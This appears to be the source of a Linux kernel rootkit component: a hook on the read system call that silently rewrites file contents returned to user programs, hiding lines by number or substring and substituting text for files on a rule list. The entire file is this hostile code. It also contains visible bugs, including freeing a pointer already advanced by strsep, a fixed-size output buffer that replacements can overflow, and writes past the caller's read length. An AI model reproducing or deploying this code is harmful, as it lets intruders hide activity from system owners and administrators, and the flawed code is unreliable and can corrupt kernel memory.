#include "alterate.h"

LIST_HEAD(modified_files_list);
spinlock_t modified_files_lock = __SPIN_LOCK_UNLOCKED(modified_files_lock);

asmlinkage long (*__orig_read)(const struct pt_regs *) = NULL;

asmlinkage long read_hook(const struct pt_regs *regs) {
    long ret = __orig_read(regs);
    if (ret <= 0)
        return ret;

    // Resolve fd absolute path
    int fd = regs->di;
    struct file *f = fget(fd);
    if (!f)
        return ret;
    struct path p = f->f_path;
    path_get(&p);
    char buf[512];
    char *fullpath = d_path(&p, buf, sizeof(buf));
    path_put(&p);
    fput(f);
    if (IS_ERR(fullpath))
        return ret;

    // Look up rule for this path
    struct modified_file *rule = NULL, *m;
    spin_lock(&modified_files_lock);
    list_for_each_entry(m, &modified_files_list, list) if (strcmp(fullpath, m->file_path) == 0) {
        rule = m;
        break;
    }
    spin_unlock(&modified_files_lock);
    if (!rule)
        return ret;

    // Copy user buffer to kernel space
    char *kbuf = kmalloc(ret + 1, GFP_KERNEL);
    if (!kbuf)
        return ret;
    if (copy_from_user(kbuf, (char __user *)regs->si, ret)) {
        kfree(kbuf);
        return ret;
    }
    kbuf[ret] = '\0';

    // Allocate a new buffer for the modified content, times 2, no other idea for the moment
    char *out = kmalloc(ret * 2 + 1, GFP_KERNEL);
    if (!out) {
        kfree(kbuf);
        return ret;
    }

    int line_no = 0;
    size_t out_len = 0;
    char *line;
    while ((line = strsep(&kbuf, "\n"))) {
        bool skip = false;
        line_no++;

        // Hide line by number
        if (rule->hide_line_with_number > 0 && line_no == rule->hide_line_with_number)
            skip = true;

        // Hide line by substring
        if (!skip && rule->hide_line_with_substring && strstr(line, rule->hide_line_with_substring))
            skip = true;

        // Replace substring
        if (!skip && rule->replace_src) {
            char *seg = line, *p2;
            while ((p2 = strstr(seg, rule->replace_src))) {
                // First part of the line
                size_t before = p2 - seg;
                memcpy(out + out_len, seg, before);
                out_len += before;

                // Replace substring
                memcpy(out + out_len, rule->replace_dst, strlen(rule->replace_dst));
                out_len += strlen(rule->replace_dst);
                seg = p2 + strlen(rule->replace_src);
            }

            // Copy the rest of the line
            strcpy(out + out_len, seg);
            out_len += strlen(seg);
            out[out_len++] = '\n';
            continue;
        }

        // Copy original line if not skipped
        if (!skip) {
            memcpy(out + out_len, line, strlen(line));
            out_len += strlen(line);
            out[out_len++] = '\n';
        }
    }
    out[out_len] = '\0';

    // Write back to user space
    if (!copy_to_user((char __user *)regs->si, out, out_len))
        ret = out_len;

    kfree(out);
    kfree(kbuf);
    return ret;
}